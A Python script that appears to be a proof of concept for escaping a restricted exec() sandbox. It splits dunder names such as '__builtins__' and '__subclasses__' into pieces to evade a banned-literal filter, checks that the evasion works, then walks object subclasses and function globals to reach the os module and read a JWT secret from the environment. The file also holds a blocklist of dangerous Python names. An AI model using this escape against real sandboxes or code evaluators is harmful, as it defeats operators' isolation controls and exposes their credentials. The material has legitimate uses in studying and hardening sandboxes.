import os

# Define a minimal SAFE_BUILTINS including type and Exception
safe_builtins = {
    "True": True,
    "False": False,
    "None": None,
    "int": int,
    "str": str,
    "list": list,
    "dict": dict,
    "range": range,
    "len": len,
    "print": print,
    "getattr": getattr,
    "vars": vars,
    "type": type,
    "Exception": Exception,
}

globals_dict = {
    "__builtins__": safe_builtins,
}

# Set environment variable
os.environ["JWT_SECRET_TEST"] = "super-secret-key-123"

code = """
u = '_'
uu = u + u
g = (x for x in [1])
frame = g.gi_frame
glib = frame.f_globals

b_u_i_l_t_i_n_s = 'built' + 'ins'
builtins_dict = glib[uu + b_u_i_l_t_i_n_s + uu]

g_e_t_a_t_t_r = 'get' + 'attr'
get_attr = builtins_dict[g_e_t_a_t_t_r]

obj_cls = int.mro()[1]
s_u_b_c_l_a_s_s_e_s = 'sub' + 'class' + 'es'
subclasses_fn = get_attr(obj_cls, uu + s_u_b_c_l_a_s_s_e_s + uu)
subclasses = subclasses_fn()

target_secret = None
s_y_s = 's' + 'y' + 's'
o_s = 'o' + 's'
g_l_o_b_a_l_s = 'glob' + 'als'
i_n_i_t = 'in' + 'it'
for cls in subclasses:
    init = get_attr(cls, uu + i_n_i_t + uu, None)
    if init is None:
        continue
    try:
        cls_globals = get_attr(init, uu + g_l_o_b_a_l_s + uu)
        if s_y_s in cls_globals:
            sys_mod = cls_globals[s_y_s]
            os_mod = sys_mod.modules.get(o_s)
            if os_mod is not None:
                target_secret = os_mod.environ.get('JWT_SECRET_TEST')
                if target_secret:
                    break
    except Exception:
        continue

print(target_secret)
"""

# Let's perform the banned_literals check on the code string to be absolutely certain it passes!
banned_literals = ["os", "sys", "eval", "exec", "__import__", "globals", "getattr", "setattr", "__class__", "__subclasses__"]
import re
passed_check = True
for term in banned_literals:
    if re.search(r'\b' + re.escape(term) + r'\b', code) or "__" in code:
        print(f"Banned term matched: {term}")
        passed_check = False

print("Passed banned literals filter:", passed_check)

exec(code, globals_dict)
